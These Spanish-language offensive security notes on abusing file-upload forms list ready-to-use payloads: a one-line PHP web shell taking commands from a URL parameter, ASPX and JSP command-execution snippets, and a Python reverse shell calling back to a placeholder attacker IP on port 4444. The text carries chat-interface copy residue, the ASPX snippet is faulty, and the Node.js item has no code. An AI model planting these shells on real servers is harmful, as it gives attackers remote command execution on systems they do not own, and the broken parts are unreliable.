Usualmente cuando nos encotramos con una opcion para subir archivos (Cambiar foto de perfil, subir un informe, etc) lo primero que debemos probar es intentar subir algún archivo malicioso, ahora, que lenguajes se pueden usar para esto: 

### 🔹 Lenguajes del lado del servidor (cuando se ejecuta el archivo subido):

1. **PHP**
 
- ✅ Muy común en servidores web (WordPress, Joomla, etc.)

- 📁 Archivo: `shell.php`  

- 📌 Uso típico: subir un _webshell_ como `c99.php`, `b374k`, o una shell personalizada.

- Ejemplo:
```php
<?php system($_GET['cmd']); ?>
```


2. **ASP / ASPX**

- ✅ Utilizado en servidores Windows (IIS)

- 📁 Archivo: `shell.asp` o `shell.aspx`

- Ejemplo (ASPX):      

```aspx
<%@ Page Language="C#" %> <% Response.Write(System.Diagnostics.Process.Start("cmd.exe")); %>
```
  
3. **JSP (Java Server Pages)**
    
    - ✅ En aplicaciones Java con Apache Tomcat
        
    - 📁 Archivo: `shell.jsp`
        
    - Ejemplo:
        
        jsp
        
        CopiarEditar
        
        `<% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>`
        
4. **Python (poco común, pero posible)**
    
    - Si el servidor acepta subir scripts `.py` y ejecutarlos, podrías usar un reverse shell.
        
    - Ejemplo:
        
        python
        
        CopiarEditar
        
        `import socket,subprocess,os s=socket.socket() s.connect(("tu-ip",4444)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) subprocess.call(["/bin/sh","-i"])`
        
5. **Node.js**
    
    - Si el servidor acepta `.js` y los ejecuta como scripts de backend (poco común pero posible)
        
    - Ejemplo: shell en JavaScript ejecutable por Node